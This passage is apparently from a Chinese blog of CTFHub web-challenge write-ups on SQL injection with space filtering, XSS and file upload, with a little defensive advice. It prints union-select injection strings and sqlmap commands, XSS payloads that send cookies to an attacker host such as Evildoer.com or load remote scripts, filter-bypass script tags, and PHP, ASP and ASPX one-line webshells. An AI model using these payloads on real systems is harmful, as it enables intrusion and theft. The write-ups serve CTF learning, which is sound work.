class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p>3.爆字段</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/Filter%20space/3.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&#x27;sqli&#x27;/**/and/**/table_name=&#x27;rpaaurgzkh&#x27;</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,group_concat(***)/**/from/**/sqli.***</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/Filter%20space/4.png" alt=""></p><h6 id="2-sqlmap-6">2.sqlmap</h6><p>这次说实话我是不怎么建议用sqlmap了，扫的时间太长了。。。</p><p><a href="https://www.cnblogs.com/0yst3r-2046/p/13268660.html">CTFHub题解-技能树-Web-SQL注入（过滤空格）【四】 - 0yst3r - 博客园 (cnblogs.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id=1&quot; --dbs --tamper &quot;space2comment.py&quot; </span><br><span class="line">python sqlmap.py -u &quot;http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id=1&quot; -D &quot;sqli&quot; --tables --tamper &quot;space2comment.py&quot; </span><br><span class="line">python sqlmap.py -u &quot;http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id=1&quot; -D &quot;sqli&quot; -T &quot;dwthlcaucd&quot; --dump --tamper &quot;space2comment.py&quot; </span><br></pre></td></tr></table></figure><h5 id="11-综合训练SQLI-LABS">11.综合训练SQLI-LABS</h5><p>这个其实就是著名sql注入网站（看到没有flag还是手贱好奇打开了浪费我50大洋😭）</p><p>可以自己搭着玩，我用Apache+PHP+Mysql一直因为php版本问题失败</p><p>可以试下这个下载<a href="https://www.cnblogs.com/zhijiya/p/14826846.html">Sqli-labs靶场搭建 </a></p><p>这个博主提供的sqli-labs可以用php7（估计是把报错的函数全部修改了，太牛了😚)</p><p>我最后选择的还是Apache+PHP+Mysql，用的是博主的sqli-labs，除了博主的sqli-labs其他上网随便都能搜到教程</p><h4 id="4-XSS">4.XSS</h4><p>因为人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，将跨站脚本攻击缩写为XSS。这就是XSS名字的由来。XSS攻击是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其他用户的使用界面中，通过代码所执行的不同行为，将Cookie或者其他信息发送给攻击者，攻击者可通过这些信息实施破坏或窃取有效信息为己用。</p><p>与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 XSS 一般提交的是 Javascript 脚本，运行在 Web 前端，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。</p><p>XSS 按照攻击的手法，一般可以分为反射型 XSS（Reflected）、存储型 XSS（Strored）、DOM 型 XSS（DOM）。</p><h5 id="0-xss平台">0.xss平台</h5><p>至于这个模块需要一个xss平台，我当时找到的要么要钱，要么注册需要邀请码，而且去找在线版的也不方便，不如就自己搭了一个，最上面的工具里面写了搭建方法（如果是在不会搭建，我搭建的可以借个你用<s>但是我服务器到期时间24-03-25</s>.，私信我）</p><blockquote><p>注意需要一台服务器，我在本地也搭了一个，但是没有办法返回flag，问了一圈，有人告诉我是内网无法接收，我去查了原因，好像网关会拦截后者权限问题，有大佬懂请赐教</p></blockquote><h5 id="1-反射型">1.反射型</h5><p>这篇博客写的挺详细<a href="https://blog.csdn.net/m0_51191308/article/details/133799363?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-133799363-blog-120031136.235%5Ev39%5Epc_relevant_3m_sort_dl_base1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=1">CTFHub | 反射型-CSDN博客</a></p><h6 id="1-初识反射型XSS">1.初识反射型XSS</h6><p>反射型XSS将用户输入的内容作为代码让浏览器执行达到攻击目的，一般需要让用户访问攻击者构造的URL。这种类型的攻击只发生在客户端上，并且需要从带有恶意脚本参数的特定URL进入，所以也称为非持久型XSS。</p><p>要使用反射型XSS，目标网页中要使用一个参数值作为动态显示到页面的数据，并且目标网页对该参数值没有进行有效的检验，这样，就能在URL中通过构造参数的方式插入XSS payload（恶意脚本），让用户在不知情的情况下点击URL，从而执行XSS payload。反射型XSS虽然只是一次性，但方便攻击者利用。</p><ul><li><p>Cookie劫持</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/19.png" alt=""></p><p>现在，有一个攻击者“小黑”，他决定对一个用户“小锅”进行cookie劫持。假设有一个页面<a href="https://link.zhihu.com/?target=http%3A//www.reflect_xss.com/test.html">http://www.reflect_xss.com/test.html</a>存在反射型XSS漏洞，小黑向小锅发送如下URL：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.reflect_xss.com/test.html?msg=&lt;script&gt;var+img=document.createElement(“img”);+img.src=”http://www.Evildoer.com/”%2bescape(document.cookie);+document.appendChild(img)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当小锅毫无察觉地访问这个URL之后，他的cookie信息就会被发送到由小黑控制的 <a href="https://link.zhihu.com/?target=http%3A//Evildoer.com">http://Evildoer.com</a>站点上，小锅访问reflect_xss的令牌被小黑获悉。于是，小黑使用这个令牌而不需要密码就可以假冒小锅进入这个网站。</p><p>如果小黑觉得这个URL太长，他可以将具体实现的脚本代码放在自己的<a href="https://link.zhihu.com/?target=http%3A//www">http://www</a>. <a href="https://link.zhihu.com/?target=http%3A//Evildoer.com">http://Evildoer.com</a>上，将URL改成：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.reflect_xss.com/test.html?msg=&lt;script+src=http://www.Evildoer.com/evil_script.js&gt; &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当这个URL被访问的时候，会加载一个恶意脚本http://Evildoer.com/evil_script.js](<a href="https://link.zhihu.com/?target=http%3A//Evildoer.com/evil_script.js">https://link.zhihu.com/?target=http%3A//Evildoer.com/evil_script.js</a>)，达到和上面方法一样的效果。事实上，小黑还可以对URL中的脚本进行URL编码，使其恶意意图看起来不那么明显。</p></li><li><p>Get请求</p><p>Get/post是web请求的两种方式，用户通过这两类请求来进行数据的增删查改。假设有一个博客网站<a href="https://link.zhihu.com/?target=http%3A//www.bloggg.com">http://www.bloggg.com</a>，上面每篇博客都有一个blogID，当用户对点击删除博客的按钮时，会发送如下请求：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bloggg.com/deleteBlog.do?blogID=123</span><br></pre></td></tr></table></figure><p>也就是说，只需要知道博客ID，已登录的用户通过请求这个URL就可以删除博客。小锅是这个博客网站的用户，他写了一篇博客（blogID=234567），小黑找到这篇博客的blogID，利用下面的XSS payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘img’);</span><br><span class="line">img.<span class="property">src</span> = <span class="attr">http</span>:<span class="comment">//www.bloggg.com/deleteBlog.do?blogID=234567</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img)</span><br></pre></td></tr></table></figure><p>当小锅不知不觉地执行了这个脚本之后，他的那篇博客就被删除了。这段代码首先创建了一个<img>元素，然后为<img>元素指定src，这个URL就是删除博客的接口。这里只是定义了元素，事实上这个请求未被执行。只有当第三行代码执行的时候，<img>被添加到网页的DOM中，这个src属性才被访问，于是执行删除博客的请求。</p></li><li><p>Post请求</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/18.png" alt=""></p><p>Get请求将参数附在URL的尾部即可传递，与此不同的是，post请求的数据不显示在URL中，这避免重要数据轻易泄露。一般来说，可以通过form表单或XMLHttpRequest提交post请求。</p><p>小黑想用小锅的账号发一条动态来欺骗他的关注者，这条动态包括心情状态（mood）和一段文本（m_text）。所以小黑写了一段脚本，往页面中插入一个表单：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evil_form = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘div’);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(evil_form);</span><br><span class="line">evil_form.<span class="property">innerHTML</span> = ‘&lt;form action=<span class="attr">http</span>:<span class="comment">//www.bloggg.com/share_mood.do name=”mood_form” id=”evil_form”&gt;’ + </span></span><br><span class="line">‘&lt;input type=”text” name=”mood” value=”happy”&gt;’ + </span><br><span class="line">‘&lt;input type=”text” name=”m_text” value=”<span class="number">000000</span>股票要飚了，买它！”&gt;’ + </span><br><span class="line">&lt;/form&gt;’</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(“evil_form”).<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure><p>这个脚本实现了form表单的自动提交，如果为表单设置display:hidden，这个表单甚至可以没有在页面出现，小锅根本无法察觉。同理可以应用于各种嵌入标签。利用XMLHttpRequest对象也能够提交数据到指定接口。</p></li><li><p>防御方式</p><p>针对cookie劫持，最简单也很有效的方法是为敏感cookie设置一个HTTPOnly属性。设置了该属性的cookie项不能被脚本读取。这保护了敏感cookie不被劫持，也允许一些其他cookie可以被脚本读取使用。</p><p>注入型的漏洞都是由于未经检查和处理就将用户可以控制的数据作为输出、作为代码执行，因此要对这样的数据进行检查。对于涉及HTML标签、JavaScript代码的字符和词汇进行编码，使之不直接以原始的形式出现，减少作为代码被执行的可能。</p><p>这些漏洞能被利用的原因都是由于将数据当做代码执行，在编写代码的时候，要尽量做到两者的分离。对于输入数据，在JavaScript中要用引号包裹，同时使用JavaScriptEncode编码字符，防止攻击者将引号闭合。减少执行输入数据的操作，XSS攻击者就失去了很多攻击机会。</p></li></ul><h6 id="2-解题">2.解题</h6><p>先在第一个空填入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; #作用是弹出一个弹窗</span><br></pre></td></tr></table></figure><p>发现能触发，那么大概率是由XSS漏洞的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/1.png" alt=""></p><p>在我们的xss平台有default.js模板,点击生成payload，输入到第一个空就行</p><blockquote><p>我的js的左下角新增，选择default.js模板，选择插入模板，记得修改第一行填入你自己的ip（不要后面的admin.php)</p></blockquote><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/7.png" alt=""></p><blockquote><p>这里我没有写出我的ip</p></blockquote><p>输入之后把url输入到第二空</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/6.png" alt=""></p><p>你的xss网站就会收到消息</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/4.png" alt=""></p><h6 id="3-总结">3.总结</h6><p>解释一下第一个空是用来产生我们可以操控而且可以被受害者访问的url的，第二个空就是用来让我们把恶意url发送给受害者让它访问的渠道的。服务器访问了我们带有xss的恶意url，运行了在xss平台服务器的脚本，所以才我们获取了它的cookie</p><h5 id="2-存储型">2.存储型</h5><p>存储型和反射性其实都差不多，唯一的差别就是payload是否会保存在目标服务器里面</p><p>最常见的就是留言板，个人信息，你填入的信息会被保存在数据库里面，当你填入的是payload的话，别人访问你的留言版时，服务器会从数据库运行payload，从而完成攻击</p><p>一句话来说就是就是<strong>使用者提交的XSS代码被存储到服务器上的数据库里或页面或某个上传文件里，导致用户访问页面展示的内容时直接触发xss代码。</strong></p><p>比如说这题，你在第一空输入的值会被保存（即刷新浏览器不会改变，是因为第一次填入的值会发送给服务器，服务器进行保存，第二张图是用burp抓的包）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/8.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/10.png" alt=""></p><p>然后步骤和反射型一样</p><p>把payload输入到第一个输入框，并点击submit.（这个时候就相当于攻击者上传xss代码到服务器）</p><p>然后把靶场url复制到第二个输入框，点击send.（这个时候就相当于被攻击者点开链接）</p><p>最后，在XSS平台查看注入结果，即可得到flag。</p><h5 id="3-DOM反射">3.DOM反射</h5><p>DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;(&#x27;#text&#x27;)[0].innerHTML = &#x27;2&#x27; # 获取DOM树id=text数组的第一个</span><br></pre></td></tr></table></figure><p>即我们可以利用闭环</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/11.png" alt=""></p><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;&lt;/sript&gt;+payload</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/15.png" alt=""></p><p>把url写到第二空，xss平台就能看到flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/9.png" alt=""></p><h5 id="4-DOM跳转">4.DOM跳转</h5><p><a href="https://blog.csdn.net/weixin_49125123/article/details/131546660">CTFHub XSS DOM跳转</a></p><p>老样子先看源码，发现script</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location.search: #这是一个JavaScript对象，表示URL的查询部分（即“?”之后的部分）。例如，在URL &quot;http://example.com/?jumpto=section2&quot;中，location.search的值是&quot;?jumpto=section2&quot;。</span><br><span class="line"></span><br><span class="line">split(&quot;=&quot;) # 这个方法用于将字符串按照给定的分隔符（在这里是等号“=”）分割成一个数组。在上述例子中，location.search.split(&quot;=&quot;)的结果是一个数组[&quot;?jumpto&quot;, &quot;section2&quot;]。</span><br><span class="line"></span><br><span class="line">target[0].slice(1):  #target[0]获取上述数组的第一个元素，即&quot;?jumpto&quot;。然后，slice(1)方法用于截取该字符串从第二个字符开始到最后的子字符串，也就是去掉第一个字符?。所以，target[0].slice(1)的结果是&quot;jumpto&quot;。</span><br><span class="line"></span><br><span class="line">if(target[0].slice(1)==&quot;jumpto&quot;): #这是一个条件判断语句，检查经过处理的查询参数名是否为&quot;jumpto&quot;。</span><br><span class="line"></span><br><span class="line">location.href=target[1]; # 如果上述条件为真，即查询参数名为&quot;jumpto&quot;，则执行这行代码。这行代码将当前页面的URL设置为查询参数的值，即&quot;section2&quot;。在这个例子中，页面会跳转到&quot;http://example.com/section2&quot;。</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/16.png" alt=""></p><p>注意！当你将类似于 location.href = “javascript:alert(‘xss’)” 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-1ccc67ea8612a9b6.sandbox.ctfhub.com:10800?jumpto=javascript:alert(1)</span><br></pre></td></tr></table></figure><p>这题我们需要把恶意url填入下面的空行，xss平台会返回flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站/?jumpto=javascript:&amp;getScript(&quot;payload的ip就行&quot;)</span><br></pre></td></tr></table></figure><p>ps：我在路径上面输入的话，xss平台并没有反应，按理来说是触发了脚本的，这里可能是因为访问失败？</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/XSS/17.png" alt=""></p><h5 id="5-过滤空格">5.过滤空格</h5><p>这个挺简单的，联想到SQL注入时的过滤空格就行了，把空格化成注释就行了，步骤和上面一样</p><h5 id="6-过滤关键字">6.过滤关键字</h5><p>这次直接浏览器输入payload，发现 <code>script </code>被过滤掉了</p><p>碰到这种情况不要慌，下面给出两种方法绕过过滤关键字。</p><p>1.双写绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;scrscriptipt src=http://xsscom.com//cZ2vvZ&gt;&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>2.大小写绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;Script src=http://xsscom.com//cZ2vvZ&gt;&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure><p>然后就是去xss平台查看flag就行了（￣︶￣）↗</p><h4 id="5-文件上传">5.文件上传</h4><p>1.漏洞简介</p><p>web应用程序没有对上传的文件进行安全判断或者判断条件不够严谨，导致恶意攻击者可以上传木马脚本文件到服务器中，从而执行恶意代码。</p><p>2.风险点</p><blockquote><p>注册/修改个人信息处（上传头像）</p><p>敏感身份认证处（身<em>证照片/银</em>卡照片/个人照片……）【多为金融/借贷应用】</p><p>订单评价反馈处（上传商品照片）【淘宝/京东……】</p><p>朋友圈/空间</p><p>所有能上传操作的地方……</p></blockquote><p>3.漏洞危害</p><blockquote><p>获取服务器WebShell权限</p><p>查看/上传/下载对方文件（任意操作对方服务器数据）</p><p>查看数据库信息（拖库）</p><p>执行命令</p><p>挂黑页（恶搞 / 报复）</p></blockquote><h5 id="0-前提知识">0.前提知识</h5><h6 id="1-Webshell（大马）">1.Webshell（大马）</h6><p>我们经常会看到Webshell，那么，到底什么是Webshell呢？</p><p>webshell就是以 asp、aspx、php、jsp 或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp、aspx、php或jsp后门文件与网站web服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。</p><blockquote><p>PHP<br>PHP是一种跨平台的服务器端的嵌入式脚本语言。它大量地借用C、Java 和 Perl 语言的语法，并耦合PHP自己的特性，使WEB开发者能够快速地写出动态产生页面。它支持目前绝大多数数据库。还有一点，PHP是完全免费的，不用花钱，你可以从PHP官方站点自由下载。而且你可以不受限制地获得源码，甚至可以从中加进你自己需要的特色。PHP脚本语言的文件后缀名是 .php</p><p>JSP<br>JSP是Sun公司推出的新一代网站开发语言，Sun公司借助自己在Java上的不凡造诣，将Java从Java应用程序和JavaApplet之外，又有新的硕果，就是JSP，JavaServerPage。JSP可以在Serverlet和JavaBean的支持下，完成功能强大的站点程序。JSP脚本语言的文件后缀名是 .jsp</p><p>ASP<br>ASP全名ActiveServerPages，是MicroSoft公司开发的服务器端脚本环境，是一个WEB服务器端的开发环境，利用它可以产生和执行动态的、互动的、高性能的WEB服务应用程序。ASP采用脚本语言VBScript（Javascript）作为自己的开发语言。asp文件后缀名是 .asp</p><p><a href="http://ASP.NET">ASP.NET</a><br>ASP.net又称为ASP+，不仅仅是ASP的简单升级，而是微软公司推出的新一代脚本语言。他不是asp的简单升级，因为他的编程方法和asp有很大的不同，他是在服务器端靠服务器编译执行的程序代码。ASP 使用脚本语言，每次请求的时候，服务器调用脚本解析引擎来解析执行其中的程序代码，<a href="http://xn--ASP-xv0i.NET">而ASP.NET</a> 则可以使用多种语言编写，而且是全编译执行的，比ASP 快，而且，不仅仅是快的问题，有很多优点。<a href="http://ASP.xn--NET-0i9dt44b.NET">ASP.NET基于.NET</a> Framework的Web开发平台，不但吸收了ASP以前版本的最大优点并参照Java、VB语言的开发优势加入了许多新的特色，同时也修正了以前的ASP版本的运行错误。 他还支持很多语言的编写，比如java、c#、<a href="http://vb.net">vb.net</a> ，功能很强。 asp.net的文件后缀名是 .aspx</p><p>几者都提供在HTML代码中混合某种程序代码、由语言引擎解释执行程序代码的能力。但JSP代码被编译成Servlet并由Java虚拟机解释执行，这种编译操作仅在对JSP页面的第一次请求时发生。在ASP/ASP.NET、PHP、JSP环境下，HTML代码主要负责描述信息的显示样式，而程序代码则用来描述处理逻辑。普通的HTML页面只依赖于Web服务器，而ASP/ASP.NET、PHP、JSP页面需要附加的语言引擎分析和执行程序代码。程序代码的执行结果被重新嵌入到HTML代码中，然后一起发送给浏览器。ASP/ASP.NET、PHP、JSP几者都是面向Web服务器的技术，客户端浏览器不需要任何附加的软件支持。</p></blockquote><p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上的操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p>一方面，webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</p><p>另一方面，被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常称为Web脚本木马，比较流行的asp或php木马，也有基于.NET的脚本木马与JSP脚本木马。</p><p>但是这里所说的木马都是些体积“庞大”的木马，也就是黑客中常称呼的&quot; 大马 &quot;。</p><h6 id="2-一句话木马-小马">2.一句话木马(小马)</h6><p>因为上面所介绍webshell概念中提到的大马在现阶段的安全领域中已经被盯的非常紧了，而且各种杀毒软件和防火墙软件都对这种“大马”有了甄别能力，所以如果被渗透的web服务器中安装了防御软件的话，留下这种大马作为自己的webshell就非常困难了，于是一种新型的webshell就横空出世了，那就是一句话木马。</p><p>简单来说一句话木马就是通过向服务端提交一句简短的代码来达到向服务器插入木马并最终获得webshell的方法。对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的 eval 或者是 execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是 request 或者是 $_POST 获取的值。如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。</p><p>一些不同脚本语言的一句话木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php一句话木马：  &lt;?php @eval($_POST[value]); ?&gt;</span><br><span class="line">asp一句话木马：  &lt;%eval request (&quot;value&quot;)%&gt; 或  &lt;% execute(request(&quot;value&quot;)) %&gt;   </span><br><span class="line">aspx一句话木马： &lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php fputs( fopen(&#x27;xie.php&#x27;,&#x27;w&#x27;) , &#x27;&lt;? php eval($_POST[xie]) ?&gt;&#x27; ) ; ?&gt;</span><br><span class="line">将当前目录下创建xie.php文件，并且将一句话木马写入xd.php中</span><br></pre></td></tr></table></figure><h6 id="3-一句话木马原理">3.一句话木马原理</h6><p>拿php的一句话木马说明一下原理：</p><p>在PHP脚本语言中，eval(code) 的功能是将 code 组合成 php 指令，然后将指令执行，其他语言中也是使用此原理，只是函数可能不同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=&quot;phpinfo()&quot;; eval(&quot;$a;&quot;);?&gt;   #就相当于执行 phpinfo（); 语句。</span><br></pre></td></tr></table></figure><p>当利用web中的漏洞将</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[value]);?&gt; </span><br></pre></td></tr></table></figure><p>一句话插入到了可以被黑客访问且能被web服务器执行的文件中时，那么我们就可以向此文件提交post数据，post方式提交数据的参数就是<strong>这个一句话中的 value</strong>，它就称为<strong>一句话木马的密码</strong>。这样提交的数据如果是正确的php语言的语句，那么就可以被一句话木马执行，从而达到黑客的恶意目的。</p><blockquote><p>1.加了@后，访问上传文件的地址则不会进行报错</p><p>2.eval()函数是执行PHP代码的一个函数。意思就是eval函数里面如果是PHP代码，那么就可以执行。</p><p>3.$_POST[‘123’]是可以进行一个提交POST参数的操作</p></blockquote><p>介绍了一句话木马的原理后，我们再来说下它的优缺点：</p><p>优点：短小精悍，功能强大。</p><p>缺点：容易被安全软件检测出来。为了增强隐蔽性，也出现了各种一句话木马的变形。</p><h6 id="4-一句话木马的变形">4.一句话木马的变形</h6><p>黑客的目的，就是想尽办法给目标网站插入一句话木马，可以是一个单独的 .asp 或者是 .php，.aspx 文件，或者是隐藏在某些网页下。</p><p>在上边的例子中，php 文件很明显的 eval 可以成为一个静态特征码，webshell扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。</p><p>资料参考：</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84563791">Webshell和一句话木马</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84593150">php、jsp、asp和aspx的区别-CSDN博客</a></p><h5 id="1-无验证">1.无验证</h5><p>其实整个过程就是利用<strong>一句话木马</strong>+<strong>蚁剑</strong>获取服务器权限，服务器通过限制<strong>一句话木马</strong>的上传来防御，我们要做的就是<strong>绕过</strong></p><p>第一问无验证当然就没有限制了</p><p>首先编写php文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/0.png" alt=""></p><p>上传</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/1.png" alt=""></p><p>打开蚁剑，右键添加数据，URL是上传文件的地址，连接密码就是POST里面的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/00.png" alt=""></p><p>测试连接后记得点击保存（添加），然后点击链接就打开了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/3.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/4.png" alt=""></p><h5 id="2-前端验证">2.前端验证</h5><p>当然还是先试试php能不能上传</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/5.png" alt=""></p><p>（看到前端验证就想到js限制，打开f12果不其然）大概含义就是仅允许.jpg .png.gif文件上传</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/6.png" alt=""></p><p>3个解决方案</p><h6 id="1-禁用js">1.禁用js</h6><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/7.png" alt=""></p><p>然后正常上传+蚁剑</p><h6 id="2-删掉触发js的代码">2.删掉触发js的代码</h6><p>即<code>onsubmit=&quot;return checkfilesuffix()&quot;</code></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/9.png" alt=""></p><p>然后正常上传+蚁剑</p><h6 id="3-使用burp">3.使用burp</h6><p>将filename=&quot;2.php&quot;改成filename=“2.png”,点击Intercept is on 放开拦截就能上传成功了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/8.png" alt=""></p><p>再用蚁剑就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/10.png" alt=""></p><h5 id="3…htaccess">3…htaccess</h5><p>这里先了解一下什么是.htacces文件</p><p>.htaccess文件(或者&quot;分布式配置文件&quot;）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 